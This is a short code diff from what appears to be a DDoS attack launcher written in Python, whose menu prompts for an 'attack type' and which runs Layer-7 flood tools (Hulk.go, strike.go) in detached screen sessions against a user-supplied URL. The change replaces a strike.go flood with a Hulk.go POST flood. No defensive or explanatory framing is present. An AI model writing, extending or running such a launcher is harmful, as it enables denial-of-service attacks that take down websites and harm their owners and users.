@@ -379,7 +379,7 @@ def main():
 \033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
 """)
                     os.system(f'cd l7 && screen -dm go run Hulk.go -site {url} {duration} -data GET')
-                    os.system(f'cd l7 && screen -dm go run strike.go --url {url} {duration}')
+                    os.system(f'cd l7 && screen -dm go run Hulk.go -site {url} {duration} -data POST')
                     
             except ValueError:
                 main()
